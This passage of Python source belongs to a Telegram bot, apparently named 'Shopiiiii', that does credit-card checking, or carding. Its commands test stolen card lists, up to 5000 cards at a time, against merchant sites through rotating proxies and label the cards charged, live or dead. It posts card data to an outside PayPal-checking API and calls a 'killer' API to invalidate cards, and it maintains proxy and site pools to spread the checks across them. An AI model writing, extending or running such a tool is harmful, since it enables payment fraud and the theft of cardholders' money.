        if 'proxy dead' in response_msg or 'invalid proxy format' in response_msg or 'no proxy' in response_msg:
            return {'proxy': proxy, 'status': 'dead'}
        else:
            return {'proxy': proxy, 'status': 'alive'}
    except:
        return {'proxy': proxy, 'status': 'dead'}
@bot.on(events.NewMessage(pattern='/start'))
async def start(event):
    await event.reply(
        premium_emoji(
            "<b>⚡💳 Welcome to Shopiiiii ! 💳⚡</b>\n"
            "<b>━━━━━━━━━━━━━━━━━</b>\n"
            "<b>⚡💠 𝐂𝐂 𝐂𝐨𝐦𝐦𝐚𝐧𝐝𝐬</b>\n"
            "<blockquote>• /cc card|mm|yy|cvv - Check single CC\n"
            "• /chk - Reply to .txt file to check cards</blockquote>\n"
            " /kill - kill a cc within 15 seconds \n"
            "<b>⚡💠 𝐒𝐢𝐭𝐞 𝐂𝐨𝐦𝐦𝐚𝐧𝐝𝐬</b>\n"
            "<blockquote>• /site - Check all sites & remove dead\n"
            "• /rm url - Remove a specific site</blockquote>\n"
            "<b>⚡💠 𝐏𝐫𝐨𝐱𝐲 𝐂𝐨𝐦𝐦𝐚𝐧𝐝𝐬</b>\n"
            "<blockquote>• /proxy - Check all proxies & remove dead\n"
            "• /addproxy - Add proxies (one per line)\n"
            "• /chkproxy proxy - Check single proxy\n"
            "• /rmproxy proxy - Remove single proxy\n"
            "• /rmproxyindex 1,2,3 - Remove by index\n"
            "• /clearproxy - Remove all proxies\n"
            "• /getproxy - Get all proxies</blockquote>\n"
            "<b>━━━━━━━━━━━━━━━━━</b>\n"
            "<b>⚠️ Only premium users can use this bot.</b>"
        ),
        parse_mode='html'
    )



#kill command
@bot.on(events.NewMessage(pattern=r'/kill'))
async def kill(event):

    user_id = event.sender_id

    if not user_id in KILLER_ALLOWED_USERS:

        await event.reply(premium_emoji("❌ <b>Access Denied</b>\n\nOnly Allowed users could use killer"), parse_mode='html')
        return
    
    if not len(event.message.text.split()) == 2:
        await event.reply(premium_emoji("❌ <b>Invalid Command</b>\n\nUse: <code>/kill card|mm|yy|cvv</code>"), parse_mode='html')
        return
    
    cc_input = event.message.text.split(' ', 1)[1].strip()
    cards = extract_cc(cc_input)

    if not cards:
        await event.reply(premium_emoji("❌ Invalid CC format. Use: <code>/kill card|mm|yy|cvv</code>"), parse_mode='html')
        return
    

    card = cards[0]
    current_date = datetime.now().strftime("%d/%m/%Y %H:%M:%S")

    status_msg = await event.reply(
        premium_emoji(
            f"<b>⚡💳 ㅤ#𝒮𝒽𝑜𝓅𝒾𝒾𝒾  💳⚡</b>\n"
            f"<b>━━━━━━━━━━━━━━━━━</b>\n"
            f"<b>⚡💠 Killing...</b>\n"
            f"<blockquote>💳 Card: <code>{card}</code></blockquote>\n"
            f"<b>━━━━━━━━━━━━━━━━━</b>"
        ),
        parse_mode='html'
    )

    try:
        result = session.get(KILLER_API, params={'cc': card}, timeout=30).json()

        brand, bin_type, level, bank, country, flag = await get_bin_info(card.split('|')[0])

        if result['message'] == "Card has been killed successfully.":
            status_emoji = "✅"
            status_text = "𝐊𝐢𝐥𝐥𝐞𝐝"


        final_resp = f"""<b>⚡💳 ㅤ#𝒮𝒽𝑜𝓅𝒾𝒾𝒾  💳⚡</b>
<b>━━━━━━━━━━━━━━━━━</b>
<b>⚡💠 𝐑𝐞𝐬𝐮𝐥𝐭𝐬</b>
<blockquote>{status_emoji} Status: {status_text}</blockquote>
<blockquote>💳 Card: <code>{result['card']}</code></blockquote>
<blockquote>📝 Response: {result['message'][:150]}</blockquote>

<b>━━━━━━━━━━━━━━━━━</b>
<b>🎯💠 𝐁𝐈𝐍 𝐈𝐧𝐟𝐨</b>
<pre>𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {brand} - {bin_type} - {level}
𝗕𝗮𝗻𝗸: {bank}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country} {flag}</pre>
<b>━━━━━━━━━━━━━━━━━</b>

🤖 <b>Bot By: @technopile </a></b>"""

        await status_msg.edit(premium_emoji(final_resp), parse_mode='html')

    except Exception as e:
        await status_msg.edit(premium_emoji(f"❌ Error killing card: {e}"), parse_mode='html')

    

#allow users to use killer command
@bot.on(events.NewMessage(pattern=r'/allowkill'))
async def allow_kill(event):

    user_id = event.sender_id

    if not user_id == OWNER_ID:
        
        await event.reply(premium_emoji("❌ <b>Access Denied</b>\n\nOnly owner can allow users to use killer"), parse_mode='html')
        return
    
    if not len(event.message.text.split()) == 2:
        await event.reply(premium_emoji("❌ <b>Invalid Command</b>\n\nUse: /allowkill (userid)"), parse_mode='html')
        return

    if not user_id in KILLER_ALLOWED_USERS:
        
        user_id = int(event.message.text.split()[1])

        KILLER_ALLOWED_USERS[user_id] = True
        await event.reply(premium_emoji("✅ <b>User Allowed</b>\n\nThis user can now use killer command"), parse_mode='html')

    
    else:
        await event.reply(premium_emoji("⚠️ <b>User Already Allowed</b>"), parse_mode='html')


#disallow users to use killer command   
@bot.on(events.NewMessage(pattern=r'/disallowkill'))
async def disallow_kill(event):

    user_id = event.sender_id

    if not user_id == OWNER_ID:
        
        await event.reply(premium_emoji("❌ <b>Access Denied</b>\n\nOnly owner can disallow users to use killer"), parse_mode='html')
        return

    if not len(event.message.text.split()) == 2:
        await event.reply(premium_emoji("❌ <b>Invalid Command</b>\n\nUse: /disallowkill (userid)"), parse_mode='html')
        return

    if user_id in KILLER_ALLOWED_USERS:

        user_id = int(event.message.text.split()[1])

        del KILLER_ALLOWED_USERS[user_id]
        await event.reply(premium_emoji("✅ <b>User Disallowed</b>\n\nThis user can no longer use killer command"), parse_mode='html')
    
    else:
        await event.reply(premium_emoji("⚠️ <b>User Not Found</b>"), parse_mode='html')



@bot.on(events.NewMessage(pattern=r'/paypal'))
async def paypal(event):

    active_session = []

    user_id = event.sender_id

    active_session.append(user_id)

    if not user_id in KILLER_ALLOWED_USERS:
        # Rate limiting
        current_time = time.time()
        if user_id in user_check_times:
            time_since_last_check = current_time - user_check_times[user_id]
            if time_since_last_check < RATE_LIMIT_SECONDS:
                wait_time = int(RATE_LIMIT_SECONDS - time_since_last_check)
                await event.reply(premium_emoji(f"⏳ <b>Rate Limit</b>\n\nPlease wait {wait_time} seconds before checking another card."), parse_mode='html')
                return
        
        # Update last check time
        user_check_times[user_id] = current_time


    PAYPAL_API = 'https://strong-production.up.railway.app/paypal'

    __headers = {

        'Content-Type': 'application/json',
    }
 
    
    
    if not len(event.message.text.split()) == 2:
        await event.reply(premium_emoji("❌ <b>Invalid Command</b>\n\nUse: <code>/paypal card|mm|yy|cvv</code>"), parse_mode='html')
        return
    
    
    num = event.message.text.split(' ')[1].strip().split('|')[0]
    mm = event.message.text.split(' ')[1].strip().split('|')[1]
    if len(event.message.text.split(' ')[1].strip().split('|')[2]) == 4:
         yy = event.message.text.split(' ')[1].strip().split('|')[2][2:]
    else:
        yy = event.message.text.split(' ')[1].strip().split('|')[2]
    cvv = event.message.text.split(' ')[1].strip().split('|')[3]

    bin = num[:6]  # Extract BIN (first 6 digits)
    card = f"{num}|{mm}|{yy}|{cvv}"


    status_msg = await event.reply(
        premium_emoji(
            f"<b>⚡💳 ㅤ#PayPal  💳⚡</b>\n"
            f"<b>━━━━━━━━━━━━━━━━━</b>\n"
            f"<b>⚡💠 Checking...</b>\n"
            f"<blockquote>💳 Card: <code>{card}</code></blockquote>\n"
            f"<b>━━━━━━━━━━━━━━━━━</b>"
        ),
        parse_mode='html'
    )

    try:
        result = session.post(PAYPAL_API, json={'num': num,
                                                  'mon': mm,
                                                  'yer': yy,
                                                  'cvc': cvv}, timeout=30).json()
        
        print('response: ',result)

        brand, bin_type, level, bank, country, flag = await get_bin_info(bin)

        if 'ISSUER_DECLINE' in result['message'] or 'GENERIC_ERROR' in result['message'] or 'GENERIC ERROR' in result['message'] or 'DECLINED' in result['message']:
            status_emoji = "❌"
            status_text = "CARD_DECLINED"
            message = result['message']
            
        elif 'APPROVED' in result['message'] or 'ACCEPTED' in result['message']:
            status_emoji = "🔥"
            status_text = "APPROVED"
            message = result['message']

        elif 'CHARGED' in result['message']:
            status_emoji = "✅"
            status_text = "CHARGED"
            message = result['message']

        else:
            status_emoji = "❌"
            status_text = "See API respone"
            message = result['message']


        final_resp = f"""<b>⚡💳 ㅤ#PayPal  💳⚡</b>
<b>━━━━━━━━━━━━━━━━━</b>
<b>⚡💠 𝐑𝐞𝐬𝐮𝐥𝐭𝐬</b>
<blockquote>{status_emoji} Status: {status_text}</blockquote>
<blockquote>💳 Card: <code>{card}</code></blockquote>
<blockquote>📝 Response: {result['message'][:150]}</blockquote>
<blockquote>🤖 Message: {message[:30]} </blockquote>
<b>━━━━━━━━━━━━━━━━━</b>
<b>🎯💠 𝐁𝐈𝐍 𝐈𝐧𝐟𝐨</b>
<pre>𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {brand} - {bin_type} - {level}
𝗕𝗮𝗻𝗸: {bank}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country} {flag}</pre>
<b>━━━━━━━━━━━━━━━━━</b>

🤖 <b>Bot By: @technopile </a></b>"""

        await status_msg.edit(premium_emoji(final_resp), parse_mode='html')

    except Exception as e:
        await status_msg.edit(premium_emoji(f"❌ Error checking card: {e}"), parse_mode='html')




@bot.on(events.NewMessage(pattern=r'^/cc\s+'))
async def single_cc_check(event):
    """Check a single CC"""
    user_id = event.sender_id

    try:
        sender = await event.get_sender()
        username = sender.username if sender.username else f"user_{user_id}"
        first_name = sender.first_name if sender.first_name else "User"
    except:
        username = f"user_{user_id}"
        first_name = "User"

    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ <b>Access Denied</b>\n\nOnly premium users can use this bot."), parse_mode='html')
        return

    sites = load_sites()
    proxies = load_proxies()

    if not sites:
        await event.reply(premium_emoji("❌ No sites available. Please contact admin."), parse_mode='html')
        return
    if not proxies:
        await event.reply(premium_emoji("❌ No proxies available. Please add proxies."), parse_mode='html')
        return

    cc_input = event.message.text.split(' ', 1)[1].strip()
    cards = extract_cc(cc_input)

    if not cards:
        await event.reply(premium_emoji("❌ Invalid CC format. Use: <code>/cc card|mm|yy|cvv</code>"), parse_mode='html')
        return

    card = cards[0]
    current_date = datetime.now().strftime("%d/%m/%Y %H:%M:%S")

    status_msg = await event.reply(
        premium_emoji(
            f"<b>⚡💳 ㅤ#𝒮𝒽𝑜𝓅𝒾𝒾𝒾  💳⚡</b>\n"
            f"<b>━━━━━━━━━━━━━━━━━</b>\n"
            f"<b>⚡💠 𝐂𝐡𝐞𝐜𝐤𝐢𝐧𝐠...</b>\n"
            f"<blockquote>💳 Card: <code>{card}</code></blockquote>\n"
            f"<b>━━━━━━━━━━━━━━━━━</b>"
        ),
        parse_mode='html'
    )

    try:
        result = await check_card_with_retry(card, sites, proxies, max_retries=3)

        brand, bin_type, level, bank, country, flag = await get_bin_info(card.split('|')[0])

        if result['status'] == 'Charged':
            status_emoji = "✅"
            status_text = "𝐂𝐡𝐚𝐫𝐠𝐞𝐝"
        elif result['status'] == 'Approved':
            status_emoji = "🔥"
            status_text = "𝐋𝐢𝐯𝐞"
        else:
            status_emoji = "❌"
            status_text = "𝐃𝐞𝐚𝐝"

        final_resp = f"""<b>⚡💳 ㅤ#𝒮𝒽𝑜𝓅𝒾𝒾𝒾  💳⚡</b>
<b>━━━━━━━━━━━━━━━━━</b>
<b>⚡💠 𝐑𝐞𝐬𝐮𝐥𝐭𝐬</b>
<blockquote>{status_emoji} Status: {status_text}</blockquote>
<blockquote>💳 Card: <code>{result['card']}</code></blockquote>
<blockquote>📝 Response: {result['message'][:150]}</blockquote>
<blockquote>🌐 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: 🔥 {result.get('gateway', 'Unknown')} | 💰 {result.get('price', '-')}</blockquote>
<b>━━━━━━━━━━━━━━━━━</b>
<b>🎯💠 𝐁𝐈𝐍 𝐈𝐧𝐟𝐨</b>
<pre>𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {brand} - {bin_type} - {level}
𝗕𝗮𝗻𝗸: {bank}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country} {flag}</pre>
<b>━━━━━━━━━━━━━━━━━</b>

🤖 <b>Bot By: @technopile </a></b>"""

        await status_msg.edit(premium_emoji(final_resp), parse_mode='html')

    except Exception as e:
        await status_msg.edit(premium_emoji(f"❌ Error checking card: {e}"), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/chkproxy\s+'))
async def check_single_proxy(event):
    """Check a single proxy"""
    user_id = event.sender_id

    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ <b>Access Denied</b>\n\nOnly premium users can use this command."), parse_mode='html')
        return

    proxy = event.message.text.split(' ', 1)[1].strip()
    if not proxy:
        await event.reply(premium_emoji("❌ Usage: <code>/chkproxy ip:port:user:pass</code>"), parse_mode='html')
        return

    status_msg = await event.reply(premium_emoji(f"🔄 Checking proxy: <code>{proxy}</code>..."), parse_mode='html')

    try:
        result = await test_proxy(proxy)

        if result['status'] == 'alive':
            await status_msg.edit(premium_emoji(f"✅ <b>Proxy is ALIVE!</b>\n\n<code>{proxy}</code>"), parse_mode='html')
        else:
            await status_msg.edit(premium_emoji(f"❌ <b>Proxy is DEAD!</b>\n\n<code>{proxy}</code>"), parse_mode='html')

    except Exception as e:
        await status_msg.edit(premium_emoji(f"❌ Error checking proxy: {e}"), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/rmproxy\s+'))
async def remove_single_proxy(event):
    """Remove a single proxy from proxy.txt"""
    user_id = event.sender_id

    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ <b>Access Denied</b>\n\nOnly premium users can use this command."), parse_mode='html')
        return

    proxy_to_remove = event.message.text.split(' ', 1)[1].strip()
    if not proxy_to_remove:
        await event.reply(premium_emoji("❌ Usage: <code>/rmproxy ip:port:user:pass</code>"), parse_mode='html')
        return

    current_proxies = load_proxies()

    if proxy_to_remove not in current_proxies:
        await event.reply(premium_emoji(f"❌ Proxy not found: <code>{proxy_to_remove}</code>"), parse_mode='html')
        return

    new_proxies = [p for p in current_proxies if p != proxy_to_remove]

    async with aiofiles.open(PROXY_FILE, 'w') as f:
        for proxy in new_proxies:
            await f.write(f"{proxy}\n")

    await event.reply(premium_emoji(f"✅ <b>Proxy Removed!</b>\n\n<code>{proxy_to_remove}</code>"), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/rmproxyindex\s+'))
async def remove_proxy_by_index(event):
    """Remove proxies by index (comma separated)"""
    user_id = event.sender_id

    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ <b>Access Denied</b>\n\nOnly premium users can use this command."), parse_mode='html')
        return

    indices_str = event.message.text.split(' ', 1)[1].strip()
    if not indices_str:
        await event.reply(premium_emoji("❌ Usage: <code>/rmproxyindex 1,2,3</code>"), parse_mode='html')
        return

    try:
        indices = [int(i.strip()) - 1 for i in indices_str.split(',')]
    except ValueError:
        await event.reply(premium_emoji("❌ Invalid indices. Use numbers separated by commas."), parse_mode='html')
        return

    current_proxies = load_proxies()

    if not current_proxies:
        await event.reply(premium_emoji("❌ No proxies in proxy.txt"), parse_mode='html')
        return

    removed = []
    new_proxies = []
    for i, proxy in enumerate(current_proxies):
        if i in indices:
            removed.append(proxy)
        else:
            new_proxies.append(proxy)

    if not removed:
        await event.reply(premium_emoji("❌ No valid indices found."), parse_mode='html')
        return

    async with aiofiles.open(PROXY_FILE, 'w') as f:
        for proxy in new_proxies:
            await f.write(f"{proxy}\n")

    await event.reply(premium_emoji(f"✅ <b>Removed {len(removed)} proxies!</b>\n\nRemoved:\n<code>" + "\n".join(removed[:10]) + ("..." if len(removed) > 10 else "") + "</code>"), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/clearproxy$'))
async def clear_all_proxies(event):
    """Remove all proxies from proxy.txt"""
    user_id = event.sender_id

    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ <b>Access Denied</b>\n\nOnly premium users can use this command."), parse_mode='html')
        return

    current_proxies = load_proxies()
    count = len(current_proxies)

    if count == 0:
        await event.reply(premium_emoji("❌ <code>proxy.txt</code> is already empty."), parse_mode='html')
        return

    # Send backup file to user
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    backup_filename = f"proxy_backup_{user_id}_{timestamp}.txt"

    try:
        async with aiofiles.open(backup_filename, 'w') as f:
            for proxy in current_proxies:
                await f.write(f"{proxy}\n")

        await event.reply(
            premium_emoji(
                f"📦 <b>Backup Created!</b>\n\n"
                f"Sending backup of {count} proxies before clearing..."
            ),
            file=backup_filename,
            parse_mode='html'
        )

        # Remove backup file after sending
        try:
            os.remove(backup_filename)
        except:
            pass

    except Exception as e:
        await event.reply(premium_emoji(f"❌ Error creating backup: {e}"), parse_mode='html')
        return

    # Clear proxy.txt
    async with aiofiles.open(PROXY_FILE, 'w') as f:
        await f.write("")

    await event.reply(premium_emoji(f"✅ <b>Cleared all {count} proxies!</b>\n\n<code>proxy.txt</code> is now empty."), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/getproxy$'))
async def get_all_proxies(event):
    """Get all proxies from proxy.txt"""
    user_id = event.sender_id

    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ <b>Access Denied</b>\n\nOnly premium users can use this command."), parse_mode='html')
        return

    current_proxies = load_proxies()

    if not current_proxies:
        await event.reply(premium_emoji("❌ No proxies in <code>proxy.txt</code>"), parse_mode='html')
        return

    if len(current_proxies) <= 50:
        proxy_list = "\n".join([f"{i+1}. <code>{p}</code>" for i, p in enumerate(current_proxies)])
        await event.reply(premium_emoji(f"<b>📋 All Proxies ({len(current_proxies)}):</b>\n\n{proxy_list}"), parse_mode='html')
    else:
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"proxies_{user_id}_{timestamp}.txt"

        async with aiofiles.open(filename, 'w') as f:
            for i, proxy in enumerate(current_proxies):
                await f.write(f"{i+1}. {proxy}\n")

        await event.reply(premium_emoji(f"<b>📋 All Proxies ({len(current_proxies)}):</b>\n\nFile attached below."), file=filename, parse_mode='html')

        try:
            os.remove(filename)
        except:
            pass

@bot.on(events.NewMessage(pattern=r'^/addproxy'))
async def add_proxy_command(event):
    """Command to add proxies to proxy.txt"""
    user_id = event.sender_id
    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ **Access Denied**\n\nOnly premium users can use this command."))
        return

    try:
        args = event.message.text.split('\n')
        if len(args) < 2:
            await event.reply(premium_emoji("❌ Usage: `/addproxy` followed by proxies, one per line."))
            return

        proxies_to_add = [line.strip() for line in args[1:] if line.strip()]
        if not proxies_to_add:
            await event.reply(premium_emoji("❌ No proxies provided."))
            return

        current_proxies = load_proxies()
        new_proxies = []

        for proxy in proxies_to_add:
            if proxy not in current_proxies:
                new_proxies.append(proxy)

        if not new_proxies:
            await event.reply(premium_emoji("⚠️ All provided proxies already exist in `proxy.txt`."))
            return

        async with aiofiles.open(PROXY_FILE, 'a') as f:
            for proxy in new_proxies:
                await f.write(f"{proxy}\n")

        await event.reply(premium_emoji(f"✅ **Proxies Added Successfully!**\n\nAdded {len(new_proxies)} new proxies to `proxy.txt`."))

    except Exception as e:
        await event.reply(premium_emoji(f"❌ Error adding proxies: {e}"))

@bot.on(events.NewMessage(pattern=r'^/rm'))
async def remove_site_command(event):
    """Command to remove a site from sites.txt"""
    user_id = event.sender_id
    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ **Access Denied**\n\nOnly premium users can use this command."))
        return

    try:
        args = event.message.text.split(' ', 1)
        if len(args) < 2:
            await event.reply(premium_emoji("❌ Usage: `/rm https://site.com`"))
            return

        url_to_remove = args[1].strip()
        current_sites = load_sites()

        if url_to_remove not in current_sites:
            await event.reply(premium_emoji(f"❌ Site not found in list: `{url_to_remove}`"))
            return

        new_sites = [site for site in current_sites if site != url_to_remove]

        async with aiofiles.open(SITES_FILE, 'w') as f:
            for site in new_sites:
                await f.write(f"{site}\n")

        await event.reply(premium_emoji(f"✅ **Site Removed Successfully!**\n\n`{url_to_remove}` has been deleted from `sites.txt`.\n\n_Active checks will stop using this site in the next batch._"))

    except Exception as e:
        await event.reply(premium_emoji(f"❌ Error removing site: {e}"))

@bot.on(events.NewMessage(pattern='/chk'))
async def check_command(event):
    """Main check command"""
    user_id = event.sender_id

    try:
        sender = await event.get_sender()
        username = sender.username if sender.username else f"user_{user_id}"
    except:
        username = f"user_{user_id}"

    if not is_premium(user_id):
        await event.reply(premium_emoji("😡 **Access Denied**\n\nOnly premium users can use this bot."))
        return

    if not event.reply_to_msg_id:
        await event.reply(premium_emoji("😡 Please reply to a .txt file containing cards......"))
        return

    reply_msg = await event.get_reply_message()
    if not reply_msg.file or not reply_msg.file.name.endswith('.txt'):
        await event.reply(premium_emoji("😡 Please reply to a .txt file."))
        return

    if not load_sites():
        await event.reply(premium_emoji("❌ No sites available. Please contact admin."))
        return
    if not load_proxies():
        await event.reply(premium_emoji("❌ No proxies available. Please add proxies to proxy.txt."))
        return

    status_msg = await event.reply(premium_emoji("🫆 Processing your file..."))

    file_path = await reply_msg.download_media()

    async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
        content = await f.read()

    cards = extract_cc(content)

    if not cards:
        await status_msg.edit(premium_emoji("😡 No valid cards found in file."))
        os.remove(file_path)
        return

    if len(cards) > 5000:
        await status_msg.edit(premium_emoji(f"🫦 File contains {len(cards)} cards. Limiting to first 5000 cards."))
        cards = cards[:5000]

    os.remove(file_path)

    total_cards = len(cards)
    await status_msg.edit(premium_emoji(f"🫦 Starting check for {total_cards} cards..."))

    session_key = f"{user_id}_{status_msg.id}"
    active_sessions[session_key] = {'paused': False}

    all_results = {
        'charged': [],
        'approved': [],
        'dead': [],
        'total': total_cards,
        'checked': 0,
        'start_time': time.time()
    }

    try:
        queue = asyncio.Queue()
        for card in cards:
            queue.put_nowait(card)
            
        last_update_time = [time.time()]

        async def worker():
            while not queue.empty() and session_key in active_sessions:
                session_state = active_sessions.get(session_key)
                if not session_state:
                    break
                while session_state.get('paused', False):
                    await asyncio.sleep(1)
                    session_state = active_sessions.get(session_key)
                    if not session_state:
                        return
                        
                try:
                    card = queue.get_nowait()
                except asyncio.QueueEmpty:
                    break
                    
                current_sites = load_sites()
                current_proxies = load_proxies()
                if not current_sites or not current_proxies:
                    break
                
                res = await check_card_with_retry(card, current_sites, current_proxies, max_retries=1)
                
                all_results['checked'] += 1
                
                if res['status'] == 'Charged':
                    all_results['charged'].append(res)
                    await send_realtime_hit(user_id, res, 'Charged', username)
                elif res['status'] == 'Approved':
                    all_results['approved'].append(res)
                    await send_realtime_hit(user_id, res, 'Approved', username)
                else:
                    all_results['dead'].append(res)
                    
                queue.task_done()
                
                # Real-time exact-completion update throttle (1.0 sec)
                now = time.time()
                if now - last_update_time[0] >= 1.0:
                    last_update_time[0] = now
                    if session_key in active_sessions:
                        try:
                            await update_progress(user_id, status_msg.id, all_results, all_results['checked'])
                        except Exception:
                            pass

        workers = [asyncio.create_task(worker()) for _ in range(10)]
        
        while workers:
            if session_key not in active_sessions:
                for w in workers:
                    if not w.done():
                        w.cancel()
                break
            done, pending = await asyncio.wait(workers, timeout=1.0)
            workers = list(pending)
        
        if session_key in active_sessions:
            await update_progress(user_id, status_msg.id, all_results, all_results['checked'])

    except Exception as e:
        await bot.send_message(user_id, premium_emoji(f"An error occurred: {e}"))
    finally:
        if session_key in active_sessions:
            del active_sessions[session_key]

        try:
            await status_msg.delete()
        except:
            pass

        await send_final_results(user_id, all_results)

@bot.on(events.NewMessage(pattern='/proxy'))
async def proxy_command(event):
    """Check all proxies and remove dead ones using a test card and site"""
    user_id = event.sender_id

    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ **Access Denied**\n\nOnly premium users can use this command."))
        return

    proxies = load_proxies()
    if not proxies:
        await event.reply(premium_emoji("❌ `proxy.txt` is empty. Nothing to check."))
        return

    status_msg = await event.reply(premium_emoji(f"🔥 Checking {len(proxies)} proxies in batches of 50..."))

    alive_proxies = []
    dead_proxies = []
    batch_size = 50

    try:
        for i in range(0, len(proxies), batch_size):
            batch = proxies[i:i + batch_size]
            tasks = [test_proxy(proxy) for proxy in batch]
            results = await asyncio.gather(*tasks)

            for res in results:
                if res['status'] == 'alive':
                    alive_proxies.append(res['proxy'])
                else:
                    dead_proxies.append(res['proxy'])

            await status_msg.edit(
                premium_emoji(
                    f"🔥 Checking proxies...\n\n"
                    f"<b>Checked:</b> {min(len(alive_proxies) + len(dead_proxies), len(proxies))}/{len(proxies)}\n"
                    f"<b>Alive:</b> {len(alive_proxies)}\n"
                    f"<b>Dead:</b> {len(dead_proxies)}"
                ),
                parse_mode='html'
            )

        async with aiofiles.open(PROXY_FILE, 'w') as f:
            for proxy in alive_proxies:
                await f.write(f"{proxy}\n")

        summary_msg = f"✅ <b>Proxy Check Complete!</b>\n\n"
        summary_msg += f"<b>Total Proxies:</b> {len(proxies)}\n"
        summary_msg += f"<b>Alive:</b> {len(alive_proxies)}\n"
        summary_msg += f"<b>Removed:</b> {len(dead_proxies)}\n\n"
        summary_msg += "<code>proxy.txt</code> has been updated with only working proxies."

        await status_msg.edit(premium_emoji(summary_msg), parse_mode='html')

    except Exception as e:
        await status_msg.edit(premium_emoji(f"❌ An error occurred during proxy check: {e}"))

@bot.on(events.NewMessage(pattern='/fuck'))
async def site_command(event):
    """Check all sites and remove dead ones"""
    user_id = event.sender_id

    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ **Access Denied**\n\nOnly premium users can use this command."))
        return

    sites = load_sites()
    if not sites:
        await event.reply(premium_emoji("❌ `sites.txt` is empty. Nothing to check."))
        return

    proxies = load_proxies()
    if not proxies:
        await event.reply(premium_emoji("❌ No proxies available. Please add proxies to proxy.txt."))
        return

    status_msg = await event.reply(premium_emoji(f"🔥 Checking {len(sites)} sites..."))

    alive_sites = []
    dead_sites = []
    batch_size = 10

    try:
        for i in range(0, len(sites), batch_size):
            batch = sites[i:i + batch_size]
            fresh_proxies = load_proxies()
            if not fresh_proxies: fresh_proxies = proxies

            tasks = [test_site(site, random.choice(fresh_proxies)) for site in batch]

            results = await asyncio.gather(*tasks)

            for res in results:
                if res['status'] == 'alive':
                    alive_sites.append(res['site'])
                else:
                    dead_sites.append(res['site'])

            await status_msg.edit(
                premium_emoji(
                    f"🔥 Checking sites...\n\n"
                    f"<b>Checked:</b> {len(alive_sites) + len(dead_sites)}/{len(sites)}\n"
                    f"<b>Alive:</b> {len(alive_sites)}\n"
                    f"<b>Dead:</b> {len(dead_sites)}"
                ),
                parse_mode='html'
            )

        async with aiofiles.open(SITES_FILE, 'w') as f:
            for site in alive_sites:
                await f.write(f"{site}\n")

        summary_msg = f"✅ **Site Check Complete!**\n\n"
        summary_msg += f"**Total Sites:** {len(sites)}\n"
        summary_msg += f"**Alive:** {len(alive_sites)}\n"
        summary_msg += f"**Removed:** {len(dead_sites)}\n\n"
        summary_msg += "`sites.txt` has been updated."

        await status_msg.edit(premium_emoji(summary_msg))

    except Exception as e:
        await status_msg.edit(premium_emoji(f"❌ An error occurred during site check: {e}"))

# Callbacks for Pause/Resume/Stop
@bot.on(events.CallbackQuery(pattern=b"pause"))
async def pause_handler(event):
    user_id = event.sender_id
    message_id = event.message_id
    session_key = f"{user_id}_{message_id}"
    if session_key in active_sessions:
        active_sessions[session_key]['paused'] = True
        await event.answer(premium_emoji("⏸️ Paused"))

@bot.on(events.CallbackQuery(pattern=b"resume"))
async def resume_handler(event):
    user_id = event.sender_id
    message_id = event.message_id
    session_key = f"{user_id}_{message_id}"
    if session_key in active_sessions:
        active_sessions[session_key]['paused'] = False
        await event.answer(premium_emoji("▶️ Resumed"))

@bot.on(events.CallbackQuery(pattern=b"stop"))
async def stop_handler(event):
    user_id = event.sender_id
    message_id = event.message_id
    session_key = f"{user_id}_{message_id}"
    if session_key in active_sessions:
        del active_sessions[session_key]
        await event.answer(premium_emoji("🛑 Stopped"))
        await event.edit(premium_emoji("😡 **Checking stopped by user.**"))





import threading
import uvicorn

def run_api():
    uvicorn.run(app, host="0.0.0.0", port=8000)

if __name__ == "__main__":

    print("✅ Bot + API started successfully!")

    api_thread = threading.Thread(
        target=run_api,
        daemon=True
    )

    api_thread.start()

    bot.run_until_disconnected()
